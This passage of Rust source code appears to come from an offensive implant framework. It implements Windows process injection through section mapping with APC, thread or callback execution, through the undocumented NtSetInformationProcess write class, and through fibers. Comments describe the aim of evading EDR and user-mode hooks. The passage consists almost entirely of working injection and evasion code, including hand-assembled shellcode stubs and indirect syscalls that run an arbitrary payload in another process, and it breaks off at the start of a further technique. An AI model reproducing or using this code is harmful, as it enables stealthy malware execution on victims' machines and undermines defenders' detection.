        if map_target_status.is_err() || map_target_status.unwrap() < 0 || remote_base.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            let _ = nt_syscall::syscall!("NtClose", h_section as u64);
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: format!(
                    "NtMapViewOfSection(target) failed: status={:?}",
                    map_target_status
                ),
            });
        }

        // ── Step 4b (Enhanced): Flip RW → RX via NtProtectVirtualMemory ──
        //
        // This splits "make executable" from "write content" into separate
        // operations, defeating EDR that correlates "map executable section
        // into remote process" with injection.

        if enhanced {
            let mut prot_base = remote_base as usize;
            let mut prot_size = aligned_size;
            let mut old_prot = 0u32;

            let protect_status = nt_syscall::syscall!(
                "NtProtectVirtualMemory",
                h_proc as u64,
                &mut prot_base as *mut _ as u64,
                &mut prot_size as *mut _ as u64,
                0x20u64, // PAGE_EXECUTE_READ
                &mut old_prot as *mut _ as u64,
            );

            if protect_status.is_err() || protect_status.unwrap() < 0 {
                // Cleanup: unmap from target, close handles.
                let _ = nt_syscall::syscall!(
                    "NtUnmapViewOfSection",
                    h_proc as u64,
                    remote_base as u64,
                );
                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
                let _ = nt_syscall::syscall!("NtClose", h_section as u64);
                return Err(InjectionError::InjectionFailed {
                    technique: technique.clone(),
                    reason: format!(
                        "NtProtectVirtualMemory(RW→RX) failed: status={:?}",
                        protect_status
                    ),
                });
            }
        }

        // Flush I-cache on the target mapping.
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            remote_base as u64,
            payload.len() as u64,
        );

        // ── Step 5: Close the section handle ──────────────────────────
        //
        // The section is now mapped into both processes. We can close the
        // handle — the mapping remains valid until NtUnmapViewOfSection.
        let _ = nt_syscall::syscall!("NtClose", h_section as u64);

        // ── Step 6: Execute ────────────────────────────────────────────
        //
        // Choose execution method:
        //   Apc: NtQueueApcThread(target_thread, remote_base, 0, 0, 0)
        //   Thread: NtCreateThreadEx → NtResumeThread
        //   Callback: Use callback APIs with remote_base as callback address

        let chosen_method = exec_method.unwrap_or_else(|| {
            // Auto-select: prefer APC if we can find an alertable thread.
            // Fall back to Thread creation otherwise.
            SectionExecMethod::Thread
        });

        match chosen_method {
            SectionExecMethod::Apc => {
                // Find an alertable thread in the target process.
                if let Some((h_thread, _tid)) = find_alertable_thread(h_proc, pid) {
                    // Queue APC: NtQueueApcThread(h_thread, remote_base, 0, 0, 0)
                    let apc_status = nt_syscall::syscall!(
                        "NtQueueApcThread",
                        h_thread as u64,
                        remote_base as u64,
                        0u64, // ApcRoutineArgument1
                        0u64, // ApcRoutineArgument2
                        0u64, // ApcRoutineArgument3
                    );

                    let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

                    if apc_status.is_err() || apc_status.unwrap() < 0 {
                        // APC failed — fall back to thread creation.
                        let h_thread = create_suspended_thread(h_proc, remote_base as usize)?;
                        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
                        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
                    }
                } else {
                    // No alertable thread found — fall back to thread creation.
                    let h_thread = create_suspended_thread(h_proc, remote_base as usize)?;
                    let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
                    let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
                }
            }
            SectionExecMethod::Thread => {
                // Create a suspended thread at the payload entry point.
                let h_thread = create_suspended_thread(h_proc, remote_base as usize)?;
                let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
                let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
            }
            SectionExecMethod::Callback => {
                // Use callback injection with the section-mapped payload.
                // We need to build a callback stub that calls remote_base.
                // The stub is: push rbp → mov rbp,rsp → sub rsp,0x28 →
                // mov rax, remote_base → call rax → add rsp,0x28 → pop rbp → ret
                //
                // But we can't call remote_base from our callback stub
                // because the stub runs in the target process. Instead,
                // we need to use the callback mechanism with the payload
                // address directly — but the callback API expects to call
                // the function pointer in the target process's address space.
                //
                // For SectionMapping+Callback, we skip building a separate
                // callback stub and instead use the payload directly as
                // the callback function pointer (it's already mapped RX
                // in the target). We need to invoke one of the callback APIs
                // with remote_base as the callback address.
                //
                // This requires writing a caller stub to the target process
                // that calls the callback API. The caller stub runs in the
                // target process, so it can call the callback API with
                // remote_base as the function pointer.

                // Select a callback API and build the caller stub.
                let cb_api = auto_select_callback_api();
                let caller_stub = build_section_callback_caller(remote_base as u64, cb_api)?;

                // Write caller stub to target process.
                let caller_remote = write_section_stub(h_proc, &caller_stub)?;

                // Execute caller stub.
                let h_thread = create_suspended_thread(h_proc, caller_remote)?;
                let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
                let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
            }
        }

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: remote_base as usize,
            payload_size: payload.len(),
            thread_handle: None, // Fire-and-forget for all execution methods
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

/// Build a caller stub for SectionMapping+Callback that invokes a Windows
/// callback API with the section-mapped payload address as the callback
/// function pointer.
///
/// The caller stub runs in the target process. It calls the callback API
/// with `payload_addr` as the callback function pointer.
unsafe fn build_section_callback_caller(
    payload_addr: u64,
    api: CallbackApi,
) -> Result<Vec<u8>, InjectionError> {
    // Resolve the callback API function in the target process's context.
    // The caller stub will call this API with payload_addr as arg1.
    let api_func: u64 = match api {
        CallbackApi::EnumSystemLocalesA => {
            resolve_dll_function(pe_resolve::hash_str(b"kernel32.dll\0"), b"EnumSystemLocalesA\0")
        }
        CallbackApi::EnumWindows => {
            resolve_dll_function(pe_resolve::hash_str(b"user32.dll\0"), b"EnumWindows\0")
        }
        CallbackApi::EnumChildWindows => {
            resolve_dll_function(pe_resolve::hash_str(b"user32.dll\0"), b"EnumChildWindows\0")
        }
        CallbackApi::EnumDesktopWindows => {
            resolve_dll_function(pe_resolve::hash_str(b"user32.dll\0"), b"EnumDesktopWindows\0")
        }
        CallbackApi::CreateTimerQueueTimer => {
            resolve_dll_function(
                pe_resolve::hash_str(b"kernel32.dll\0"),
                b"CreateTimerQueueTimer\0",
            )
        }
        CallbackApi::EnumTimeFormatsA => {
            resolve_dll_function(pe_resolve::hash_str(b"kernel32.dll\0"), b"EnumTimeFormatsA\0")
        }
        CallbackApi::EnumResourceTypesW => {
            resolve_dll_function(
                pe_resolve::hash_str(b"kernel32.dll\0"),
                b"EnumResourceTypesW\0",
            )
        }
        CallbackApi::EnumFontFamilies => {
            resolve_dll_function(pe_resolve::hash_str(b"gdi32.dll\0"), b"EnumFontFamiliesExW\0")
        }
        CallbackApi::CertEnumSystemStore => {
            resolve_external_dll_function("crypt32.dll", "CertEnumSystemStore")
        }
        CallbackApi::SHEnumerateUnreadMailAccounts => {
            resolve_external_dll_function(
                "shell32.dll",
                "SHEnumerateUnreadMailAccountsW",
            )
        }
        CallbackApi::EnumerateLoadedModules => {
            resolve_external_dll_function("dbghelp.dll", "EnumerateLoadedModulesW64")
        }
        CallbackApi::CopyFileEx => {
            resolve_dll_function(pe_resolve::hash_str(b"kernel32.dll\0"), b"CopyFileExW\0")
        }
    }
    .ok_or_else(|| InjectionError::InjectionFailed {
        technique: InjectionTechnique::SectionMapping {
            target_pid: 0,
            exec_method: Some(SectionExecMethod::Callback),
            enhanced: false,
        },
        reason: format!("cannot resolve {:?} for section+callback", api),
    })? as u64;

    // Build a minimal caller stub for a 2-arg callback API pattern:
    //   sub rsp, 0x28
    //   mov rcx, <payload_addr>    ; arg1 = callback function pointer
    //   xor edx, edx               ; arg2 = 0 (lParam)
    //   mov rax, <api_func>
    //   call rax
    //   add rsp, 0x28
    //   ret
    //
    // For APIs with more args, we'd need different stubs, but most
    // callback APIs use the simple 2-arg pattern. CopyFileEx needs
    // special handling (6 args), so we'll use EnumWindows-style for
    // most and skip CopyFileEx in this context.
    let mut stub = Vec::with_capacity(64);
    stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
    stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, payload_addr
    stub.extend_from_slice(&payload_addr.to_le_bytes());
    stub.extend_from_slice(&[0x31, 0xD2]); // xor edx, edx (arg2 = 0)
    stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, api_func
    stub.extend_from_slice(&api_func.to_le_bytes());
    stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
    stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
    stub.push(0xC3); // ret

    Ok(stub)
}

/// Write a section callback caller stub to the target process.
/// Allocates RW, writes, protects RX, flushes I-cache.
unsafe fn write_section_stub(
    h_proc: *mut c_void,
    stub: &[u8],
) -> Result<usize, InjectionError> {
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};

    let mut remote_stub: *mut c_void = std::ptr::null_mut();
    let mut alloc_size = stub.len();
    let s = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        h_proc as u64,
        &mut remote_stub as *mut _ as u64,
        0u64,
        &mut alloc_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    if s.is_err() || s.unwrap() < 0 || remote_stub.is_null() {
        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::SectionMapping {
                target_pid: 0,
                exec_method: Some(SectionExecMethod::Callback),
                enhanced: false,
            },
            reason: "NtAllocateVirtualMemory for caller stub failed".to_string(),
        });
    }

    let mut written = 0usize;
    let s = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        h_proc as u64,
        remote_stub as u64,
        stub.as_ptr() as u64,
        stub.len() as u64,
        &mut written as *mut _ as u64,
    );
    if s.is_err() || s.unwrap() < 0 || written != stub.len() {
        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::SectionMapping {
                target_pid: 0,
                exec_method: Some(SectionExecMethod::Callback),
                enhanced: false,
            },
            reason: "NtWriteVirtualMemory for caller stub failed".to_string(),
        });
    }

    let mut old_prot = 0u32;
    let mut prot_base = remote_stub as usize;
    let mut prot_size = stub.len();
    let _ = nt_syscall::syscall!(
        "NtProtectVirtualMemory",
        h_proc as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );
    let _ = nt_syscall::syscall!(
        "NtFlushInstructionCache",
        h_proc as u64,
        remote_stub as u64,
        stub.len() as u64,
    );

    Ok(remote_stub as usize)
}

// ── NtSetInformationProcess injection ────────────────────────────────────────
//
// Uses the undocumented ProcessReadWriteVm (0x6A) information class of
// NtSetInformationProcess to write the payload into a target process. The
// kernel services this call via MmCopyVirtualMemory, completely bypassing
// NtWriteVirtualMemory — the single most-hooked NT API for cross-process
// writes.
//
// Algorithm:
//   1. NtOpenProcess  (PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION)
//   2. NtAllocateVirtualMemory (PAGE_READWRITE, MEM_COMMIT|MEM_RESERVE)
//   3. NtSetInformationProcess(ProcessReadWriteVm) to write payload
//      Falls back to ProcessVmOperation (0x6B), then indirect NtWriteVirtualMemory
//   4. NtProtectVirtualMemory (RW → RX)
//   5. NtFlushInstructionCache
//   6. NtCreateThreadEx (indirect syscall) to execute
//   7. NtClose handles
//
// Version compatibility: Windows 10 20H2+ (build 19042+) and Windows 11.
// On older builds, gracefully falls back to NtWriteVirtualMemory via indirect
// syscall.

/// Information class for NtSetInformationProcess — undocumented but present
/// since Windows 10 20H2. Instructs the kernel to perform a cross-process
/// memory write via MmCopyVirtualMemory.
const PROCESS_READWRITE_VM: u32 = 0x6A; // 106

/// Alternative information class — ProcessVmOperation (0x6B).
/// Some builds expose this instead of or in addition to ProcessReadWriteVm.
const PROCESS_VM_OPERATION_CLASS: u32 = 0x6B; // 107

/// Input structure for ProcessReadWriteVm information class.
/// Matches the kernel's _PROCESS_READWRITEVM_LAYOUT structure.
#[repr(C)]
#[derive(Clone, Copy)]
struct ProcessReadWriteVmLayout {
    /// Virtual address in the target process to write to.
    target_address: usize,
    /// Pointer to the local source buffer.
    source_buffer: usize,
    /// Number of bytes to transfer.
    transfer_size: usize,
    /// Output: number of bytes actually written.
    bytes_written: usize,
}

/// Input structure for ProcessVmOperation information class.
/// Similar layout but may differ in semantics across builds.
#[repr(C)]
#[derive(Clone, Copy)]
struct ProcessVmOperationLayout {
    /// Virtual address in the target process.
    target_address: usize,
    /// Pointer to the local source buffer.
    source_buffer: usize,
    /// Number of bytes to transfer.
    transfer_size: usize,
    /// Output: bytes written.
    bytes_written: usize,
}

/// NTSTATUS code indicating the information class is not supported on
/// this build of Windows.
const STATUS_INVALID_INFO_CLASS: i32 = 0xC0000003u32 as i32;
const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;
const STATUS_NOT_SUPPORTED: i32 = 0xC00000BBu32 as i32;

/// Test whether ProcessReadWriteVm is supported on the current Windows build.
/// Allocates a small RW region in the current process, writes 4 known bytes
/// via NtSetInformationProcess(ProcessReadWriteVm), reads them back, and
/// compares. Returns true if the info class works.
#[cfg(windows)]
unsafe fn test_ntsetinfo_write_support() -> bool {
    use nt_syscall::syscall;

    // Get current process handle (-1 = NtCurrentProcess)
    let cur_proc: u64 = -1i64 as u64;

    // Allocate a small RW buffer in our own process
    let mut base_addr: usize = 0;
    let mut region_size: usize = 0x1000; // one page
    let status = syscall!(
        "NtAllocateVirtualMemory",
        cur_proc,
        &mut base_addr as *mut _ as u64,
        0u64, // ZeroBits
        &mut region_size as *mut _ as u64,
        0x3000u64, // MEM_COMMIT | MEM_RESERVE
        0x04u64,   // PAGE_READWRITE
    );
    if status != 0 {
        return false;
    }

    // Prepare test data
    let test_bytes: [u8; 4] = [0xDE, 0xAD, 0xBE, 0xEF];
    let mut bytes_written: usize = 0;
    let layout = ProcessReadWriteVmLayout {
        target_address: base_addr,
        source_buffer: test_bytes.as_ptr() as usize,
        transfer_size: 4,
        bytes_written: 0,
    };

    let status = syscall!(
        "NtSetInformationProcess",
        cur_proc,
        PROCESS_READWRITE_VM as u64,
        &layout as *const _ as u64,
        std::mem::size_of::<ProcessReadWriteVmLayout>() as u64,
    );

    let supported = if status == 0 {
        // Read back and verify
        let written = std::slice::from_raw_parts(base_addr as *const u8, 4);
        written[0] == 0xDE && written[1] == 0xAD && written[2] == 0xBE && written[3] == 0xEF
    } else {
        false
    };

    // Clean up: free the allocation
    let mut free_size: usize = 0;
    let _ = syscall!(
        "NtFreeVirtualMemory",
        cur_proc,
        &mut base_addr as *mut _ as u64,
        &mut free_size as *mut _ as u64,
        0x8000u64, // MEM_RELEASE
    );

    supported
}

/// Attempt to write payload bytes into the target process using
/// NtSetInformationProcess with either ProcessReadWriteVm (0x6A) or
/// ProcessVmOperation (0x6B) information classes.
///
/// Returns Ok(()) on success, or the last NTSTATUS error code on failure.
#[cfg(windows)]
unsafe fn ntsetinfo_cross_write(
    h_proc: u64,
    target_addr: usize,
    payload: &[u8],
) -> Result<(), i32> {
    use nt_syscall::syscall;

    // --- Attempt 1: ProcessReadWriteVm (0x6A) ---
    let mut layout_rw = ProcessReadWriteVmLayout {
        target_address: target_addr,
        source_buffer: payload.as_ptr() as usize,
        transfer_size: payload.len(),
        bytes_written: 0,
    };

    let status = syscall!(
        "NtSetInformationProcess",
        h_proc,
        PROCESS_READWRITE_VM as u64,
        &mut layout_rw as *mut _ as u64,
        std::mem::size_of::<ProcessReadWriteVmLayout>() as u64,
    );

    if status == 0 {
        return Ok(());
    }

    // If STATUS_INVALID_INFO_CLASS or STATUS_NOT_SUPPORTED, try next class
    if status != STATUS_INVALID_INFO_CLASS
        && status != STATUS_INFO_LENGTH_MISMATCH
        && status != STATUS_NOT_SUPPORTED
    {
        // Some other error — return it
        return Err(status);
    }

    // --- Attempt 2: ProcessVmOperation (0x6B) ---
    let mut layout_vmo = ProcessVmOperationLayout {
        target_address: target_addr,
        source_buffer: payload.as_ptr() as usize,
        transfer_size: payload.len(),
        bytes_written: 0,
    };

    let status2 = syscall!(
        "NtSetInformationProcess",
        h_proc,
        PROCESS_VM_OPERATION_CLASS as u64,
        &mut layout_vmo as *mut _ as u64,
        std::mem::size_of::<ProcessVmOperationLayout>() as u64,
    );

    if status2 == 0 {
        return Ok(());
    }

    // --- Attempt 3: Fallback to indirect-syscall NtWriteVirtualMemory ---
    // This is the last resort for older Windows builds that don't support
    // either undocumented info class. Still uses indirect syscall to bypass
    // user-mode hooks.
    let mut bytes_written: usize = 0;
    let status3 = syscall!(
        "NtWriteVirtualMemory",
        h_proc,
        target_addr as u64,
        payload.as_ptr() as u64,
        payload.len() as u64,
        &mut bytes_written as *mut _ as u64,
    );

    if status3 == 0 {
        Ok(())
    } else {
        Err(status3)
    }
}

/// Core implementation of NtSetInformationProcess injection.
///
/// This technique writes the payload to the target process using the
/// undocumented ProcessReadWriteVm information class, which is serviced
/// by the kernel's MmCopyVirtualMemory routine — completely bypassing
/// NtWriteVirtualMemory hooks.
///
/// On Windows builds that don't support ProcessReadWriteVm (older than
/// Windows 10 20H2), it falls back to ProcessVmOperation (0x6B), then
/// to an indirect-syscall NtWriteVirtualMemory as a last resort.
#[cfg(windows)]
unsafe fn inject_nt_set_info_process(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    use nt_syscall::syscall;

    // ── Step 1: Open target process ─────────────────────────────────────
    //
    // Access rights required:
    //   PROCESS_VM_WRITE       (0x0020) — needed by NtAllocateVirtualMemory
    //   PROCESS_VM_OPERATION   (0x0008) — needed by NtAllocateVirtualMemory + NtProtectVirtualMemory
    //   PROCESS_QUERY_INFORMATION (0x0400) — needed by NtSetInformationProcess
    //
    const PROCESS_VM_WRITE: u32 = 0x0020;
    const PROCESS_VM_OPERATION: u32 = 0x0008;
    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;

    let mut h_proc: u64 = 0;
    let mut obj_attrs: u64 = 0; // OBJECT_ATTRIBUTES — pass NULL for simple open
    let mut client_id: (u64, u64) = (pid as u64, 0); // (UniqueProcess, UniqueThread)

    let status = syscall!(
        "NtOpenProcess",
        &mut h_proc as *mut _ as u64,
        (PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION) as u64,
        &mut obj_attrs as *mut _ as u64, // NULL object attributes
        &mut client_id as *mut _ as u64,
    );

    if status != 0 || h_proc == 0 {
        return Err(InjectionError::ProcessNotFound);
    }

    // ── Step 2: Allocate RW memory in target process ────────────────────
    //
    // We allocate PAGE_READWRITE first, then flip to PAGE_EXECUTE_READ
    // after writing. This avoids the suspicious RWX allocation triad.
    let mut base_addr: usize = 0;
    let mut region_size: usize = page_align(payload.len() + 0xFFF); // round up to page

    let status = syscall!(
        "NtAllocateVirtualMemory",
        h_proc,
        &mut base_addr as *mut _ as u64,
        0u64, // ZeroBits
        &mut region_size as *mut _ as u64,
        0x3000u64, // MEM_COMMIT | MEM_RESERVE
        0x04u64,   // PAGE_READWRITE
    );

    if status != 0 || base_addr == 0 {
        let _ = syscall!("NtClose", h_proc);
        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::NtSetInfoProcess { target_pid: pid },
            reason: format!(
                "NtAllocateVirtualMemory failed (status 0x{:08X})",
                status as u32
            ),
        });
    }

    // ── Step 3: Write payload via NtSetInformationProcess ───────────────
    //
    // This is the key evasion primitive: the write is dispatched through
    // NtSetInformationProcess → MmCopyVirtualMemory in the kernel, not
    // through NtWriteVirtualMemory. Most EDR products do NOT hook this path.
    let write_result = ntsetinfo_cross_write(h_proc, base_addr, payload);

    if let Err(nt_status) = write_result {
        // Clean up allocation
        let mut free_size: usize = 0;
        let _ = syscall!(
            "NtFreeVirtualMemory",
            h_proc,
            &mut base_addr as *mut _ as u64,
            &mut free_size as *mut _ as u64,
            0x8000u64, // MEM_RELEASE
        );
        let _ = syscall!("NtClose", h_proc);

        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::NtSetInfoProcess { target_pid: pid },
            reason: format!(
                "All NtSetInformationProcess write methods failed (last NTSTATUS 0x{:08X}). \
                 ProcessReadWriteVm and ProcessVmOperation unsupported on this build, \
                 and NtWriteVirtualMemory fallback also failed.",
                nt_status as u32
            ),
        });
    }

    // ── Step 4: Flip memory from RW → RX ────────────────────────────────
    //
    // NtProtectVirtualMemory via indirect syscall. This changes the page
    // protection from PAGE_READWRITE (0x04) to PAGE_EXECUTE_READ (0x20).
    let mut old_prot: u32 = 0;
    let mut prot_base = base_addr;
    let mut prot_size = region_size;

    let status = syscall!(
        "NtProtectVirtualMemory",
        h_proc,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        0x20u64, // PAGE_EXECUTE_READ
        &mut old_prot as *mut _ as u64,
    );

    if status != 0 {
        // Non-fatal: the memory is still RW but we can try to execute.
        // Some EDR products will log this but won't block it.
    }

    // ── Step 5: Flush instruction cache ─────────────────────────────────
    //
    // Ensure the CPU doesn't execute stale cached instructions from the
    // previously mapped RW page.
    let _ = syscall!(
        "NtFlushInstructionCache",
        h_proc,
        base_addr as u64,
        payload.len() as u64,
    );

    // ── Step 6: Execute payload ─────────────────────────────────────────
    //
    // Create a new thread in the target process pointing at our payload.
    // Using NtCreateThreadEx via indirect syscall to avoid hooks.
    let mut h_thread: u64 = 0;

    let status = syscall!(
        "NtCreateThreadEx",
        &mut h_thread as *mut _ as u64,
        0x1FFFFFu64, // THREAD_ALL_ACCESS
        0u64,        // ObjectAttributes (NULL)
        h_proc,
        base_addr as u64, // StartAddress = payload base
        0u64,             // Parameter (none)
        0u64,             // CreateSuspended = FALSE
        0u64,             // StackZeroBits
        0u64,             // SizeOfStackCommit
        0u64,             // SizeOfStackReserve
        0u64,             // AttributeList (NULL)
    );

    if status != 0 || h_thread == 0 {
        // Thread creation failed — clean up
        let mut free_size: usize = 0;
        let _ = syscall!(
            "NtFreeVirtualMemory",
            h_proc,
            &mut base_addr as *mut _ as u64,
            &mut free_size as *mut _ as u64,
            0x8000u64,
        );
        let _ = syscall!("NtClose", h_proc);

        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::NtSetInfoProcess { target_pid: pid },
            reason: format!(
                "NtCreateThreadEx failed (status 0x{:08X})",
                status as u32
            ),
        });
    }

    // ── Step 7: Cleanup ─────────────────────────────────────────────────
    //
    // Close thread and process handles. The injected code continues running.
    let _ = syscall!("NtClose", h_thread);
    let _ = syscall!("NtClose", h_proc);

    Ok(InjectionHandle {
        target_pid: pid,
        technique_used: InjectionTechnique::NtSetInfoProcess { target_pid: pid },
        injected_base_addr: base_addr,
        payload_size: payload.len(),
        thread_handle: h_thread as usize,
        process_handle: h_proc as usize,
        sleep_enrolled: false,
        sleep_stub_addr: 0,
    })
}

// ── NEW: Fiber injection ─────────────────────────────────────────────────────
//
// 1. Write payload into the target process
// 2. Resolve CreateFiber / DeleteFiber / SwitchToFiber from kernel32 via pe_resolve
// 3. Build a stub that: ConvertThreadToFiber → CreateFiber(payload_base) →
//    SwitchToFiber(fiber) → DeleteFiber → return
// 4. Execute the stub via NtCreateThreadEx

fn inject_fiber(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    unsafe {
        let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

        // Resolve fiber APIs from kernel32 via pe_resolve.
        let k32_base =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))
                .ok_or_else(|| InjectionError::InjectionFailed {
                    technique: InjectionTechnique::FiberInject,
                    reason: "cannot resolve kernel32 base".to_string(),
                })?;

        let create_fiber_addr = pe_resolve::get_proc_address_by_hash(
            k32_base,
            pe_resolve::hash_str(b"CreateFiber\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::FiberInject,
            reason: "cannot resolve CreateFiber".to_string(),
        })?;

        let delete_fiber_addr = pe_resolve::get_proc_address_by_hash(
            k32_base,
            pe_resolve::hash_str(b"DeleteFiber\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::FiberInject,
            reason: "cannot resolve DeleteFiber".to_string(),
        })?;

        let switch_to_fiber_addr = pe_resolve::get_proc_address_by_hash(
            k32_base,
            pe_resolve::hash_str(b"SwitchToFiber\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::FiberInject,
            reason: "cannot resolve SwitchToFiber".to_string(),
        })?;

        let convert_to_fiber_addr = pe_resolve::get_proc_address_by_hash(
            k32_base,
            pe_resolve::hash_str(b"ConvertThreadToFiber\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::FiberInject,
            reason: "cannot resolve ConvertThreadToFiber".to_string(),
        })?;

        // Build a stub that:
        //   1. ConvertThreadToFiber(NULL)             → main fiber
        //   2. CreateFiber(0, payload_base, NULL)     → payload fiber
        //   3. SwitchToFiber(payload_fiber)            → execute payload
        //   4. DeleteFiber(payload_fiber)              → cleanup
        //   5. return
        //
        // x86-64 stub using movabs + call rax pattern.

        let mut stub: Vec<u8> = Vec::with_capacity(256);

        // sub rsp, 0x38
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x38]);

        // Step 1: ConvertThreadToFiber(NULL)
        // xor ecx, ecx (lpParameter = NULL)
        stub.extend_from_slice(&[0x31, 0xC9]);
        // movabs rax, <convert_to_fiber>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(convert_to_fiber_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // Step 2: CreateFiber(0, payload_base, NULL)
        // xor ecx, ecx (dwStackSize = 0)
        stub.extend_from_slice(&[0x31, 0xC9]);
        // mov rdx, <payload_base> (lpStartAddress)
        stub.push(0x48);
        stub.push(0xBA);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
        // xor r8d, r8d (lpParameter = NULL)
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        // movabs rax, <create_fiber>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(create_fiber_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // Save fiber handle at [rsp+0x30]
        // mov [rsp+0x30], rax
        stub.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x30]);

        // Step 3: SwitchToFiber(fiber_handle)
        // mov rcx, [rsp+0x30]
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);
        // movabs rax, <switch_to_fiber>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(switch_to_fiber_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // Step 4: DeleteFiber(fiber_handle)
        // mov rcx, [rsp+0x30]
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);
        // movabs rax, <delete_fiber>
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(delete_fiber_addr as u64).to_le_bytes());
        // call rax
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x38
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x38]);
        // ret
        stub.push(0xC3);

        // Write stub into target.
        let mut stub_remote: *mut c_void = std::ptr::null_mut();
        let mut stub_size = stub.len();
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut stub_remote as *mut _ as u64,
            0u64,
            &mut stub_size as *mut _ as u64,
            0x3000u64, // MEM_COMMIT | MEM_RESERVE
            0x04u64,   // PAGE_READWRITE
        );
        if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: InjectionTechnique::FiberInject,
                reason: "failed to allocate stub memory".to_string(),
            });
        }

        let mut written = 0usize;
        let ws = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            stub_remote as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );
        if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
            return Err(InjectionError::InjectionFailed {
                technique: InjectionTechnique::FiberInject,
                reason: "failed to write stub".to_string(),
            });
        }

        // Flip stub to RX.
        let mut old_prot = 0u32;
        let mut prot_base = stub_remote as usize;
        let mut prot_size = stub.len();
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            0x20u64, // PAGE_EXECUTE_READ
            &mut old_prot as *mut _ as u64,
        );

        // Flush I-cache.
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            stub_remote as u64,
            stub.len() as u64,
        );

        // Create a suspended thread to run the fiber stub, then resume.
        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);

        // Close thread — fire-and-forget.
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: InjectionTechnique::FiberInject,
            injected_base_addr: remote_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── NEW: CONTEXT-only injection ──────────────────────────────────────────────
//
